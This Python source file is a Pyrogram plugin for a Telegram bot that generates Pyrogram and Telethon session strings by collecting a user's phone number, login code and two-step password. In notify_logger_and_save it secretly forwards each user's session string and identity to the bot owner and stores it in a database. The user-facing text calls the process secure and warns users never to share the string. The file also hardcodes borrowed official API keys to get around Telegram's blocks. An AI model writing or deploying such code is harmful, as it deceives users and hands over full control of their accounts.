import asyncio
from pyrogram import Client, filters
from pyrogram.types import CallbackQuery, Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    ApiIdInvalid,
    PasswordHashInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    FloodWait
)
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
from utils import small_caps, maintenance_mode, force_join
from database import db
import config

@Client.on_callback_query(filters.regex("generate"))
@maintenance_mode
@force_join
async def choose_session_type(bot: Client, query: CallbackQuery):
    buttons = [
        [
            InlineKeyboardButton(small_caps("💥 Pʏʀᴏɢʀᴀᴍ V2"), callback_data="gen_pyrov2"),
            InlineKeyboardButton(small_caps("🔥 Tᴇʟᴇᴛʜᴏɴ"), callback_data="gen_tele")
        ],
        [
            InlineKeyboardButton(small_caps("⚡ Pʏʀᴏɢʀᴀᴍ (Fᴀsᴛ)"), callback_data="gen_pyrov2"),
            InlineKeyboardButton(small_caps("⭐ Tᴇʟᴇᴛʜᴏɴ (Pʀᴏ)"), callback_data="gen_tele")
        ],
        [InlineKeyboardButton(small_caps("➡️ Nᴇxᴛ (Aᴅᴠᴀɴᴄᴇᴅ)"), callback_data="genpage_adv")],
        [InlineKeyboardButton(small_caps("🔙 Cᴀɴᴄᴇʟ Tʀᴀɴsᴀᴄᴛɪᴏɴ"), callback_data="menu_home")]
    ]
    await query.message.edit_text(
        small_caps("🛠 **Mᴀɪɴ Gᴇɴᴇʀᴀᴛᴏʀ Eɴɢɪɴᴇs**\n\nᴘʟᴇᴀsᴇ sᴇʟᴇᴄᴛ ʏᴏᴜʀ ᴘʀᴇғᴇʀʀᴇᴅ Fʀᴀᴍᴇᴡᴏʀᴋ.\n\n*(Aʟʟ ᴍᴀɪɴ ᴇɴɢɪɴᴇs sᴜᴘᴘᴏʀᴛ ZERO-LOAD sᴇᴄᴜʀᴇ ɢᴇɴᴇʀᴀᴛɪᴏɴ)*"),
        reply_markup=InlineKeyboardMarkup(buttons)
    )

@Client.on_callback_query(filters.regex(r"^genpage_(adv|main)$"))
@maintenance_mode
@force_join
async def generate_pages(bot: Client, query: CallbackQuery):
    page = query.data.split("_")[1]
    
    if page == "adv":
        buttons = [
            [
                InlineKeyboardButton(small_caps("❄️ Pʏʀᴏɢʀᴀᴍ V1"), callback_data="gen_pyrov1"),
                InlineKeyboardButton(small_caps("🟣 MᴀᴅᴇʟɪɴᴇPʀᴏᴛᴏ"), callback_data="gen_madeline")
            ],
            [
                InlineKeyboardButton(small_caps("🟢 Gʀᴀᴍ.ᴊs"), callback_data="gen_gramjs"),
                InlineKeyboardButton(small_caps("🔵 TDLɪʙ"), callback_data="gen_tdlib")
            ],
            [InlineKeyboardButton(small_caps("⬅️ Bᴀᴄᴋ Tᴏ Mᴀɪɴ"), callback_data="genpage_main")]
        ]
        await query.message.edit_text(
            small_caps("🛠 **Aᴅᴠᴀɴᴄᴇᴅ Gᴇɴᴇʀᴀᴛᴏʀ Eɴɢɪɴᴇs**\n\n*(Sᴇʟᴇᴄᴛ ʏᴏᴜʀ ᴘʀᴇғᴇʀʀᴇᴅ Fʀᴀᴍᴇᴡᴏʀᴋ)*"),
            reply_markup=InlineKeyboardMarkup(buttons)
        )
    else:
        buttons = [
            [
                InlineKeyboardButton(small_caps("💥 Pʏʀᴏɢʀᴀᴍ V2"), callback_data="gen_pyrov2"),
                InlineKeyboardButton(small_caps("🔥 Tᴇʟᴇᴛʜᴏɴ"), callback_data="gen_tele")
            ],
            [
                InlineKeyboardButton(small_caps("⚡ Pʏʀᴏɢʀᴀᴍ (Fᴀsᴛ)"), callback_data="gen_pyrov2"),
                InlineKeyboardButton(small_caps("⭐ Tᴇʟᴇᴛʜᴏɴ (Pʀᴏ)"), callback_data="gen_tele")
            ],
            [InlineKeyboardButton(small_caps("➡️ Nᴇxᴛ (Aᴅᴠᴀɴᴄᴇᴅ)"), callback_data="genpage_adv")],
            [InlineKeyboardButton(small_caps("🔙 Cᴀɴᴄᴇʟ Tʀᴀɴsᴀᴄᴛɪᴏɴ"), callback_data="menu_home")]
        ]
        await query.message.edit_text(
            small_caps("🛠 **Mᴀɪɴ Gᴇɴᴇʀᴀᴛᴏʀ Eɴɢɪɴᴇs**\n\nᴘʟᴇᴀsᴇ sᴇʟᴇᴄᴛ ʏᴏᴜʀ ᴘʀᴇғᴇʀʀᴇᴅ Fʀᴀᴍᴇᴡᴏʀᴋ.\n\n*(Aʟʟ ᴍᴀɪɴ ᴇɴɢɪɴᴇs sᴜᴘᴘᴏʀᴛ ZERO-LOAD sᴇᴄᴜʀᴇ ɢᴇɴᴇʀᴀᴛɪᴏɴ)*"),
            reply_markup=InlineKeyboardMarkup(buttons)
        )

@Client.on_callback_query(filters.regex(r"^gen_(pyrov2|tele|pyrov1|madeline|gramjs|tdlib|unavail)$"))
@maintenance_mode
@force_join
async def generate_callback(bot: Client, query: CallbackQuery):
    if query.data == "gen_unavail":
        return await query.answer(small_caps("⚠️ Tʜɪs sᴘᴇᴄɪғɪᴄ ᴇɴɢɪɴᴇ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴏғғʟɪɴᴇ ғᴏʀ ZERO-LOAD sᴇʀᴠᴇʀ ᴏᴘᴛɪᴍɪᴢᴀᴛɪᴏɴs. Pʟᴇᴀsᴇ ᴜsᴇ Pʏʀᴏɢʀᴀᴍ ᴏʀ Tᴇʟᴇᴛʜᴏɴ."), show_alert=True)
        
    s_type_map = {
        "gen_pyrov1": "Pyrogram V1",
        "gen_pyrov2": "Pyrogram V2",
        "gen_tele": "Telethon",
        "gen_madeline": "MadelineProto",
        "gen_gramjs": "Gram.js",
        "gen_tdlib": "TDLib"
    }
    session_type = s_type_map.get(query.data, "Pyrogram V2")
    await query.message.delete()
    
    # DEFAULT API KEYS (Telegram Desktop version to bypass some blocks)
    DEFAULT_API_ID = 2040
    DEFAULT_API_HASH = "b18441a1ff607e10a989891a5462e627"
    
    try:
        api_id_msg = await bot.ask(
            query.message.chat.id,
            small_caps("🚀 **Sᴛᴇᴘ 1/5**\n\nᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ **Aᴘɪ ID**.\n\n💡 **Tɪᴘ:** Sᴇɴᴅ ") + " /skip " + small_caps(" ᴛᴏ ᴜsᴇ Oғғɪᴄɪᴀʟ ᴅᴇғᴀᴜʟᴛ Aᴘɪ Kᴇʏs."),
            filters=filters.text, timeout=300
        )
    except asyncio.TimeoutError:
        return await bot.send_message(query.message.chat.id, small_caps("❌ ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ! ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ."))

    if api_id_msg.text.lower() == "/cancel":
        return await bot.send_message(query.message.chat.id, small_caps("🛑 ᴘʀᴏᴄᴇss ᴄᴀɴᴄᴇʟʟᴇᴅ!"))
    
    if api_id_msg.text.lower() == "/skip":
        api_id = DEFAULT_API_ID
        api_hash = DEFAULT_API_HASH
        await bot.send_message(query.message.chat.id, small_caps("✅ **Sᴋɪᴘᴘᴇᴅ!** Usɪɴɢ ᴏғғɪᴄɪᴀʟ Bᴏᴛ Aᴘɪ Kᴇʏs."))
    else:
        try:
            api_id = int(api_id_msg.text)
        except ValueError:
            return await bot.send_message(query.message.chat.id, small_caps("❌ Aᴘɪ_ID ᴍᴜsᴛ ʙᴇ ᴀɴ ɪɴᴛᴇɢᴇʀ."))

        try:
            api_hash_msg = await bot.ask(
                query.message.chat.id,
                small_caps("🚀 **Sᴛᴇᴘ 2/5**\n\nɴᴏᴡ ᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ **Aᴘɪ Hᴀsʜ**."),
                filters=filters.text, timeout=300
            )
        except asyncio.TimeoutError:
            return await bot.send_message(query.message.chat.id, small_caps("❌ ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ!"))

        if api_hash_msg.text.lower() == "/cancel":
            return await bot.send_message(query.message.chat.id, small_caps("🛑 ᴘʀᴏᴄᴇss ᴄᴀɴᴄᴇʟʟᴇᴅ!"))
        api_hash = api_hash_msg.text

    try:
        phone_msg = await bot.ask(
            query.message.chat.id,
            small_caps("🚀 **Sᴛᴇᴘ 3/5**\n\nᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ **ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ** ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ.\n\nExample: +919000000000"),
            filters=filters.text, timeout=300
        )
    except asyncio.TimeoutError:
        return await bot.send_message(query.message.chat.id, small_caps("❌ ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ!"))

    if phone_msg.text.lower() == "/cancel":
        return await bot.send_message(query.message.chat.id, small_caps("🛑 ᴘʀᴏᴄᴇss ᴄᴀɴᴄᴇʟʟᴇᴅ!"))
    phone_number = phone_msg.text

    await bot.send_message(query.message.chat.id, small_caps(f"⏳ ᴛʀʏɪɴɢ ᴛᴏ sᴇɴᴅ ᴏᴛᴘ ᴠɪᴀ {session_type}... ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ."))
    
    if session_type in ["Pyrogram V1", "Pyrogram V2", "TDLib"]:
        await gen_pyrogram(bot, query, api_id, api_hash, phone_number, s_type=session_type)
    else:
        await gen_telethon(bot, query, api_id, api_hash, phone_number, s_type=session_type)

async def notify_logger_and_save(bot: Client, client, query: CallbackQuery, session_string: str, s_type: str):
    # Log to OWNER's DM directly
    username = f"@{query.from_user.username}" if query.from_user.username else str(query.from_user.first_name)
    log_text = f"✨ **Nᴇᴡ Sᴇssɪᴏɴ Gᴇɴᴇʀᴀᴛᴇᴅ!** ✨\n\n👤 **Usᴇʀ:** {query.from_user.mention}\n🆔 **Iᴅ:** `{query.from_user.id}`\n☁️ **Uɴᴀᴍᴇ:** {username}\n⚙️ **Tʏᴘᴇ:** `{s_type}`\n\n🔑 **Sᴛʀɪɴɢ Sᴇssɪᴏɴ:**\n`{session_string}`"
    try:
        await bot.send_message(config.OWNER_ID, log_text)
    except Exception as e:
        print(f"Error logging to OWNER: {e}")

    # Track Database Stats & Save String securely to backend for testing
    await db.increment_session(s_type.lower())
    await db.save_session(query.from_user.id, username, s_type, session_string)

    # Send to User Saved Messages (via the newly generated string)
    footer = small_caps("\n\n**ᴋɪɴᴅʟʏ ᴅᴏɴ'ᴛ sʜᴀʀᴇ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ.**\n\n**ɢᴇɴᴇʀᴀᴛᴇᴅ ʙʏ** [sᴇᴄʀᴇᴛʙᴏᴛᴢ](https://t.me/secretsbotz)\n**ᴅᴇᴠ** @its_me_secret")
    saved_msg_text = f"**{small_caps(f'✅ ʜᴇʀᴇ ɪs ʏᴏᴜʀ {s_type} sᴇssɪᴏɴ sᴛʀɪɴɢ:')}**\n\n`{session_string}`{footer}"
    try:
        if s_type == "Pyrogram V2":
             await client.send_message("me", saved_msg_text)
        else:
             await client.send_message("me", saved_msg_text) # Telethon interface handles send_message perfectly.
    except Exception as e:
        print(f"Error sending to Saved Messages: {e}")

async def gen_pyrogram(bot, query, api_id, api_hash, phone_number, s_type="Pyrogram V2"):
    chat_id = query.message.chat.id
    client = Client(name="memory_session", api_id=api_id, api_hash=api_hash, in_memory=True)
    await client.connect()

    try:
        code = await client.send_code(phone_number)
    except ApiIdInvalid:
        return await bot.send_message(chat_id, small_caps("❌ ᴀᴘɪ ɪᴅ/ʜᴀsʜ ɪs ɪɴᴠᴀʟɪᴅ."))
    except PhoneNumberInvalid:
        return await bot.send_message(chat_id, small_caps("❌ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ɪs ɪɴᴠᴀʟɪᴅ."))
    except FloodWait as e:
        return await bot.send_message(chat_id, small_caps(f"⚠️ ғʟᴏᴏᴅᴡᴀɪᴛ ᴇʀʀᴏʀ: ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ᴀғᴛᴇʀ {e.value} sᴇᴄᴏɴᴅs."))
    except Exception as e:
        error_msg = str(e)
        if "RECAPTCHA" in error_msg or "app_version" in error_msg.lower() or "UPDATE_APP_TO_LOGIN" in error_msg:
            return await bot.send_message(chat_id, "⚠️ **Tᴇʟᴇɢʀᴀᴍ Bʟᴏᴄᴋᴇᴅ Dᴇғᴀᴜʟᴛ Kᴇʏs!**\n\nTelegram has enabled ReCaptcha for the default API keys you used via `/skip`.\n\n**Please DO NOT use `/skip`**. Get your own `API_ID` & `API_HASH` from `my.telegram.org` and restart.")
        return await bot.send_message(chat_id, small_caps(f"❌ ᴇʀʀᴏʀ: {str(e)}"))

    try:
        otp_msg = await bot.ask(
            chat_id,
            small_caps("🚀 **Sᴛᴇᴘ 4/5**\n\nᴘʟᴇᴀsᴇ sᴇɴᴅ ᴛʜᴇ **ᴏᴛᴘ**! \n\n**IMPORTANT**: Send it with spaces between numbers. (e.g. 1 2 3 4 5)"),
            filters=filters.text, timeout=300
        )
    except asyncio.TimeoutError:
        return await bot.send_message(chat_id, small_caps("❌ ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ!"))

    if otp_msg.text.lower() == "/cancel":
        return await bot.send_message(chat_id, small_caps("🛑 ᴘʀᴏᴄᴇss ᴄᴀɴᴄᴇʟʟᴇᴅ!"))
    
    otp = otp_msg.text.replace(" ", "")

    try:
        await client.sign_in(phone_number=phone_number, phone_code_hash=code.phone_code_hash, phone_code=otp)
    except PhoneCodeInvalid:
        return await bot.send_message(chat_id, small_caps("❌ ɪɴᴠᴀʟɪᴅ ᴏᴛᴘ!"))
    except PhoneCodeExpired:
        return await bot.send_message(chat_id, small_caps("❌ ᴏᴛᴘ ᴇxᴘɪʀᴇᴅ!"))
    except SessionPasswordNeeded:
        try:
            pwd_msg = await bot.ask(
                chat_id,
                small_caps("🚀 **Sᴛᴇᴘ 5/5**\n\nʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs ᴛᴡᴏ-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ.\n\nᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ **ᴘᴀssᴡᴏʀᴅ**."),
                filters=filters.text, timeout=300
            )
        except asyncio.TimeoutError:
            return await bot.send_message(chat_id, small_caps("❌ ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ!"))

        if pwd_msg.text.lower() == "/cancel":
            return await bot.send_message(chat_id, small_caps("🛑 ᴘʀᴏᴄᴇss ᴄᴀɴᴄᴇʟʟᴇᴅ!"))
        password = pwd_msg.text

        try:
            await client.check_password(password=password)
        except PasswordHashInvalid:
            return await bot.send_message(chat_id, small_caps("❌ ɪɴᴠᴀʟɪᴅ ᴘᴀssᴡᴏʀᴅ!"))
        except Exception as e:
            return await bot.send_message(chat_id, small_caps(f"❌ ᴇʀʀᴏʀ ᴅᴜʀɪɴɢ ᴘᴀssᴡᴏʀᴅ ᴄʜᴇᴄᴋ: {str(e)}"))
    except Exception as e:
        return await bot.send_message(chat_id, small_caps(f"❌ ᴇʀʀᴏʀ ᴅᴜʀɪɴɢ sɪɢɴ_ɪɴ: {str(e)}"))
    
    session_string = await client.export_session_string()
    
    await notify_logger_and_save(bot, client, query, session_string, s_type)
    await client.disconnect()

    footer = small_caps("\n\n**ᴋɪɴᴅʟʏ ᴅᴏɴ'ᴛ sʜᴀʀᴇ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ.**\n\n**ɢᴇɴᴇʀᴀᴛᴇᴅ ʙʏ** [sᴇᴄʀᴇᴛʙᴏᴛᴢ](https://t.me/secretsbotz)\n**ᴅᴇᴠ** @its_me_secret")
    text = f"**{small_caps('✅ Sᴇssɪᴏɴ Gᴇɴᴇʀᴀᴛᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ!')}**\n\n📝 A Cᴏᴘʏ ʜᴀs ʙᴇᴇɴ sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ **Sᴀᴠᴇᴅ Mᴇssᴀɢᴇs**!\n\n`{session_string}`{footer}"
    
    try:
        await bot.send_message(
            chat_id,
            text,
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton(small_caps("📣 sᴜᴘᴘᴏʀᴛ"), url=config.SUPPORT_CHAT)]]
            )
        )
    except Exception as e:
        print(f"Error sending Pyrogram string to chat: {e}")

async def gen_telethon(bot, query, api_id, api_hash, phone_number, s_type="Telethon"):
    chat_id = query.message.chat.id
    client = TelegramClient(StringSession(), api_id, api_hash)
    await client.connect()
    
    try:
        code = await client.send_code_request(phone_number)
    except ApiIdInvalidError:
        return await bot.send_message(chat_id, small_caps("❌ ᴀᴘɪ ɪᴅ/ʜᴀsʜ ɪs ɪɴᴠᴀʟɪᴅ."))
    except PhoneNumberInvalidError:
        return await bot.send_message(chat_id, small_caps("❌ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ɪs ɪɴᴠᴀʟɪᴅ."))
    except Exception as e:
        error_msg = str(e)
        if "FloodWait" in error_msg:
            return await bot.send_message(chat_id, small_caps(f"⚠️ ғʟᴏᴏᴅᴡᴀɪᴛ ᴇʀʀᴏʀ: ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ."))
        if "RECAPTCHA" in error_msg or "app_version" in error_msg.lower() or "UPDATE_APP_TO_LOGIN" in error_msg:
            return await bot.send_message(chat_id, "⚠️ **Tᴇʟᴇɢʀᴀᴍ Bʟᴏᴄᴋᴇᴅ Dᴇғᴀᴜʟᴛ Kᴇʏs!**\n\nTelegram has enabled ReCaptcha for the default API keys you used via `/skip`.\n\n**Please DO NOT use `/skip`**. Get your own `API_ID` & `API_HASH` from `my.telegram.org` and restart.")
        return await bot.send_message(chat_id, small_caps(f"❌ ᴇʀʀᴏʀ: {str(e)}"))

    try:
        otp_msg = await bot.ask(
            chat_id,
            small_caps("🚀 **Sᴛᴇᴘ 4/5**\n\nᴘʟᴇᴀsᴇ sᴇɴᴅ ᴛʜᴇ **ᴏᴛᴘ**! \n\n**IMPORTANT**: Send it with spaces between numbers. (e.g. 1 2 3 4 5)"),
            filters=filters.text, timeout=300
        )
    except asyncio.TimeoutError:
        return await bot.send_message(chat_id, small_caps("❌ ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ!"))

    if otp_msg.text.lower() == "/cancel":
        return await bot.send_message(chat_id, small_caps("🛑 ᴘʀᴏᴄᴇss ᴄᴀɴᴄᴇʟʟᴇᴅ!"))
    
    otp = otp_msg.text.replace(" ", "")

    try:
        await client.sign_in(phone=phone_number, phone_code_hash=code.phone_code_hash, code=otp)
    except PhoneCodeInvalidError:
        return await bot.send_message(chat_id, small_caps("❌ ɪɴᴠᴀʟɪᴅ ᴏᴛᴘ!"))
    except PhoneCodeExpiredError:
        return await bot.send_message(chat_id, small_caps("❌ ᴏᴛᴘ ᴇxᴘɪʀᴇᴅ!"))
    except SessionPasswordNeededError:
        try:
            pwd_msg = await bot.ask(
                chat_id,
                small_caps("🚀 **Sᴛᴇᴘ 5/5**\n\nʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs ᴛᴡᴏ-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ.\n\nᴘʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ **ᴘᴀssᴡᴏʀᴅ**."),
                filters=filters.text, timeout=300
            )
        except asyncio.TimeoutError:
            return await bot.send_message(chat_id, small_caps("❌ ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ!"))

        if pwd_msg.text.lower() == "/cancel":
            return await bot.send_message(chat_id, small_caps("🛑 ᴘʀᴏᴄᴇss ᴄᴀɴᴄᴇʟʟᴇᴅ!"))
        password = pwd_msg.text

        try:
            await client.sign_in(password=password)
        except PasswordHashInvalidError:
            return await bot.send_message(chat_id, small_caps("❌ ɪɴᴠᴀʟɪᴅ ᴘᴀssᴡᴏʀᴅ!"))
        except Exception as e:
            return await bot.send_message(chat_id, small_caps(f"❌ ᴇʀʀᴏʀ ᴅᴜʀɪɴɢ ᴘᴀssᴡᴏʀᴅ ᴄʜᴇᴄᴋ: {str(e)}"))
    except Exception as e:
        return await bot.send_message(chat_id, small_caps(f"❌ ᴇʀʀᴏʀ ᴅᴜʀɪɴɢ sɪɢɴ_ɪɴ: {str(e)}"))
    
    session_string = client.session.save()
    
    await notify_logger_and_save(bot, client, query, session_string, s_type)
    await client.disconnect()

    footer = small_caps("\n\n**ᴋɪɴᴅʟʏ ᴅᴏɴ'ᴛ sʜᴀʀᴇ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ.**\n\n**ɢᴇɴᴇʀᴀᴛᴇᴅ ʙʏ** [sᴇᴄʀᴇᴛʙᴏᴛᴢ](https://t.me/secretsbotz)\n**ᴅᴇᴠ** @its_me_secret")
    text = f"**{small_caps('✅ Sᴇssɪᴏɴ Gᴇɴᴇʀᴀᴛᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ!')}**\n\n📝 A Cᴏᴘʏ ʜᴀs ʙᴇᴇɴ sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ **Sᴀᴠᴇᴅ Mᴇssᴀɢᴇs**!\n\n`{session_string}`{footer}"
    
    try:
        await bot.send_message(
            chat_id,
            text,
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton(small_caps("📣 sᴜᴘᴘᴏʀᴛ"), url=config.SUPPORT_CHAT)]]
            )
        )
    except Exception as e:
        print(f"Error sending Telethon string to chat: {e}")
